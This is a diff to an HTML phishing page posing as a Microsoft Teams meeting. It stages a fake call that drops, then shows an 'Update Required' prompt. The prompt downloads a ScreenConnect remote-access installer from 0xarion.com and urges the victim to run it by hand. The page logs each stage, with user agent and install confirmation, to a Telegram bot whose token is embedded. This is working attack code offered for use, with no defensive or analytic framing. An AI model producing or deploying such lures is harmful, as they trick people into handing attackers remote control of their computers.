@@ -15,21 +15,22 @@
             background-color: #000;
         }
 
-        /* Background Image - Blurred to mimic pre-join */
+        /* Background Layer */
         .bg-layer {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('https://i.ibb.co/93mbz6vN/grok-image-440c9515-f42f-4ca7-83a7-d2904731eacd.jpg');
+            background-image: url('https://i.ibb.co/G4nzN2vT/grok-image-440c9515-f42f-4ca7-83a7-d2904731eacd.jpg'); 
             background-size: cover;
             background-position: center;
             z-index: 1;
-            filter: blur(8px) brightness(0.8); /* Stronger blur for realism */
+            filter: blur(15px);
+            transform: scale(1.1);
         }
 
-        /* Main Content Container - Centered vertically and horizontally */
+        /* Main Content Container */
         .main-content {
             position: relative;
             z-index: 5;
@@ -40,9 +41,10 @@
             height: 100%;
             text-align: center;
             color: white;
+            transition: opacity 0.5s ease;
         }
 
-        /* The Red Phone Icon */
+        /* Red X Icon */
         .icon-x {
             width: 60px;
             height: 60px;
@@ -60,27 +62,132 @@
             fill: white;
         }
 
-        /* The "Sorry..." Text */
+        /* Text Styles */
         .sorry-text {
             font-size: 24px;
             font-weight: 600;
             margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
         }
         .explanation-text {
             font-size: 14px;
-            color: #ccc;
+            color: #fff;
             margin-bottom: 40px;
+            max-width: 400px;
+            line-height: 1.5;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
         }
 
-        /* The Update Dialog - Positioned exactly as per the screenshot */
+        /* === CALL DIALOGUE BOX === */
+        .call-dialogue {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            background-color: #1f1f1f;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            z-index: 20;
+            display: none; /* Hidden initially */
+            overflow: hidden;
+            border: 1px solid #333;
+        }
+
+        .call-header {
+            background-color: #2d2d2d;
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #444;
+        }
+
+        .caller-name {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .call-timer {
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 5px;
+            font-family: monospace;
+        }
+
+        .call-body {
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .avatar-circle {
+            width: 80px;
+            height: 80px;
+            background-color: #5b5fc7;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .call-status {
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .call-controls {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .control-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #333;
+            border: none;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .control-btn.end-call {
+            background-color: #ff5f57;
+            width: 50px;
+            height: 50px;
+        }
+
+        /* Disconnected State */
+        .call-disconnected {
+            background-color: #2a1a1a;
+            border-color: #ff5f57;
+        }
+        .call-disconnected .call-header {
+            background-color: #3a1a1a;
+        }
+        .call-disconnected .call-status {
+            color: #ff5f57;
+            font-weight: bold;
+        }
+
+        /* === UPDATE MODAL (Appears after call drop) === */
         .modal-container {
             position: fixed;
-            bottom: 20px; /* Anchored to the bottom */
+            bottom: 20px;
             left: 50%;
-            transform: translateX(-50%); /* Perfectly centered */
+            transform: translateX(-50%) translateY(100px); /* Start hidden below */
             width: 400px;
             max-width: 90%;
-            z-index: 10;
+            z-index: 15; 
+            transition: all 0.5s ease;
+            opacity: 0;
         }
 
         .modal-box {
@@ -89,7 +196,6 @@
             border-radius: 4px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.4);
             text-align: center;
-            animation: fadeIn 0.3s ease-out;
         }
 
         .modal-title {
@@ -123,85 +229,224 @@
             background-color: #4a4ea8;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        /* Success Message Modal */
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 25px;
+            border-radius: 4px;
+            width: 320px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            z-index: 30;
         }
+
+        .success-icon {
+            color: #0078d4;
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        .manual-note {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+            font-style: italic;
+        }
+
+        /* Install Button Style */
+        .btn-install {
+            background-color: #0078d4; /* Blue for action */
+            margin-top: 10px;
+        }
+        .btn-install:hover {
+            background-color: #005a9e;
+        }
+
     </style>
 </head>
 <body>
 
-    <!-- Background Layer -->
+    <!-- Background -->
     <div class="bg-layer"></div>
 
-    <!-- Main Centered Content (The "Sorry" Screen) -->
-    <div class="main-content">
-        <!-- Red X Icon -->
+    <!-- Stage 1: Initial Error Screen (Visible behind call) -->
+    <div class="main-content" id="stageOne">
         <div class="icon-x">
             <svg viewBox="0 0 24 24">
-                <path d="M20 15.5C20 16.88 18.88 18 17.5 18H6.5C5.12 18 4 16.88 4 15.5V8.5C4 7.12 5.12 6 6.5 6H17.5C18.88 6 20 7.12 20 8.5V15.5ZM6 8.5V15.5H7V8.5H6ZM9 8.5V15.5H10V8.5H9ZM12 8.5V15.5H13V8.5H12ZM15 8.5V15.5H16V8.5H15Z"/>
+                <path d="M20 15.5C20 16.88 18.88 18 17.5 18H6.5C5.12 18 4 16.88 4 15.5V8.5C4 7.12 5.12 6 6.5 6H17.5C18.88 6 20 7.12 20 8.5V15.5Z"/>
             </svg>
         </div>
-        
+
         <div class="sorry-text">Sorry, we couldn't connect you.</div>
         <div class="explanation-text">This version of Microsoft Teams needs to be updated.<br>Please update the app to continue.</div>
+
+        <!-- Update Modal starts hidden/below -->
+        <div class="modal-container" id="updateModal">
+            <div class="modal-box">
+                <div class="modal-title">Update Required</div>
+                <div class="modal-desc">Please update Microsoft Teams to resolve connection issues.</div>
+                <button class="btn-primary" id="updateBtn">Update Now</button>
+            </div>
+        </div>
     </div>
 
-    <!-- Bottom Modal Dialog -->
-    <div class="modal-container">
-        <div class="modal-box">
-            <div class="modal-title">Update Required</div>
-            <div class="modal-desc">Please update Microsoft Teams to continue.</div>
-            
-            <button class="btn-primary" id="updateBtn">Update</button>
+    <!-- Stage 2: Call Dialogue (Visible first) -->
+    <div class="call-dialogue" id="callDialogue">
+        <div class="call-header">
+            <div class="caller-name">Team Meeting</div>
+            <div class="call-timer" id="timerDisplay">00:00</div>
         </div>
+        <div class="call-body">
+            <div class="avatar-circle">TM</div>
+            <div class="call-status" id="callStatusText">Connecting...</div>
+            
+            <div class="call-controls">
+                <button class="control-btn">🎤</button>
+                <button class="control-btn">📷</button>
+                <button class="control-btn end-call" onclick="endCall()">📞</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stage 3: Success/Manual Install Message -->
+    <div class="success-modal" id="successModal">
+        <div class="success-icon">✅</div>
+        <div class="modal-title">Download Complete</div>
+        <div class="modal-desc">
+            The update file has been downloaded successfully.
+        </div>
+        <div class="manual-note">
+            Please open your Downloads folder and install the file manually.
+        </div>
+        <button class="btn-primary btn-install" id="installBtn">I Installed It</button>
     </div>
 
     <script>
         // === CONFIGURATION ===
-        const TELEGRAM_BOT_TOKEN = '8751898702:AAGLQM3LI6UsBMjLx5QgGQKH0rLtV5y8OeM'; 
-        const TELEGRAM_CHAT_ID = '8478799631';     
-        const PAYLOAD_URL = 'https://0xarion.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest';          
+        const TELEGRAM_BOT_TOKEN = '8751898702:AAGLQM3LI6UsBMjLx5QgGQKH0rLtV5y8OeM';
+        const TELEGRAM_CHAT_ID = '8478799631';
+        const PAYLOAD_URL = 'https://0xarion.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest';
 
-        const updateBtn = document.getElementById('updateBtn');
+        let seconds = 0;
+        let timerInterval;
 
-        // Helper: Send Notification
-        async function notify(message) {
+        // Helper function to send logs to Telegram
+        async function logToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const body = {
+            const body = JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text: message,
                 parse_mode: 'HTML'
-            };
+            });
+            
             try {
-                await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
-            } catch (e) { console.error(e); }
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: body
+                });
+            } catch (error) {
+                console.error('Telegram notification failed:', error);
+            }
         }
 
-        // Helper: Get IP
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                return (await res.json()).ip;
-            } catch (e) { return 'Unknown'; }
+        // 1. Start Call Immediately on Load
+        window.onload = function() {
+            document.getElementById('callDialogue').style.display = 'block';
+            
+            // Start Timer
+            timerInterval = setInterval(updateTimer, 1000);
+            
+            // Simulate connection status
+            setTimeout(() => {
+                document.getElementById('callStatusText').textContent = 'Connected';
+            }, 1000);
+
+            // 2. End Call after 6 seconds
+            setTimeout(() => {
+                endCall();
+            }, 6000);
+        };
+
+        function updateTimer() {
+            seconds++;
+            const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
+            const secs = (seconds % 60).toString().padStart(2, '0');
+            document.getElementById('timerDisplay').textContent = `${mins}:${secs}`;
         }
 
-        // Click Event
-        updateBtn.addEventListener('click', async () => {
-            updateBtn.textContent = 'Updating...';
-            updateBtn.disabled = true;
+        function endCall() {
+            clearInterval(timerInterval);
+            
+            // Visual effect of disconnect
+            const dialogue = document.getElementById('callDialogue');
+            const statusText = document.getElementById('callStatusText');
+            
+            dialogue.classList.add('call-disconnected');
+            statusText.textContent = 'Disconnected';
+            statusText.style.color = '#ff5f57';
+            
+            // Shrink the call window
+            dialogue.style.width = '200px';
+            dialogue.style.height = '80px';
+            dialogue.querySelector('.call-body').style.display = 'none';
+            dialogue.querySelector('.call-header').style.padding = '10px';
+            dialogue.querySelector('.caller-name').style.fontSize = '14px';
 
-            // Notify: Download Started
-            await notify("⬇️ Update Downloaded!\n\nPayload: ScreenConnect.ClientSetup.exe\nIP: " + await getIP() + "\nTime: " + new Date().toLocaleString());
+            // 3. Show Update Modal AFTER call drops
+            setTimeout(() => {
+                const modal = document.getElementById('updateModal');
+                modal.style.opacity = '1';
+                modal.style.transform = 'translateX(-50%) translateY(0)';
+                
+                // Send Notification: Call Dropped + Update Requested
+                logToTelegram(`🚨 <b>Event: Call Drop & Update Triggered</b>\n\nTime: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent.substring(0, 50)}...`);
+            }, 1000);
+        }
+
+        // Handle Update Button Click
+        document.getElementById('updateBtn').addEventListener('click', function() {
+            const btn = this;
+            btn.textContent = 'Downloading...';
+            btn.disabled = true;
+            btn.style.backgroundColor = '#4a4ea8';
 
             // Trigger Download
-            const link = document.createElement('a');
-            link.href = PAYLOAD_URL;
-            link.download = ''; 
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            window.location.href = PAYLOAD_URL;
+
+            // Show Success Message after short delay
+            setTimeout(() => {
+                document.getElementById('successModal').style.display = 'block';
+                // Hide other elements to focus on success
+                document.getElementById('stageOne').style.display = 'none';
+                document.getElementById('callDialogue').style.display = 'none';
+                
+                // Send Notification: Download Started
+                logToTelegram(`⬇️ <b>Download Started</b>\n\nThe payload has been sent to the victim's browser.\nTime: ${new Date().toLocaleString()}`);
+            }, 1000);
+        });
+
+        // Handle Install Button Click
+        document.getElementById('installBtn').addEventListener('click', function() {
+            const btn = this;
+            btn.textContent = 'Installing...';
+            btn.disabled = true;
+            
+            // Simulate installation time
+            setTimeout(() => {
+                btn.textContent = 'Installed Successfully';
+                btn.style.backgroundColor = '#28a745'; // Green
+                
+                // Send Final Notification: Install Confirmed
+                logToTelegram(`✅ <b>Installation Confirmed</b>\n\nVictim clicked "I Installed It".\nTime: ${new Date().toLocaleString()}`);
+            }, 2000);
         });
     </script>
+
 </body>
 </html>
